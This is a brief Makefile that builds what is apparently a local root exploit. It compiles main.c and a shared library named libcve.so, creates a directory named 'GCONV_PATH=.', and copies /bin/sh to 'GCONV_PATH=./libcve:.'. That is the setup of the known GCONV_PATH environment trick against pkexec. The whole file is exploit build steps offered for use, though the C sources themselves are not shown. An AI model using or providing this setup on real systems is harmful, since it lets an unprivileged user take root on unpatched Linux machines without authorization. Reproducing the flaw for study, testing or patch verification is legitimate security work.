all:
	gcc main.c -o main
	gcc payload.c -shared -o libcve.so
	mkdir "GCONV_PATH=."
	cp /bin/sh "GCONV_PATH=./libcve:."
clean:
	rm -rf "GCONV_PATH=."
	rm libcve.so
	rm main
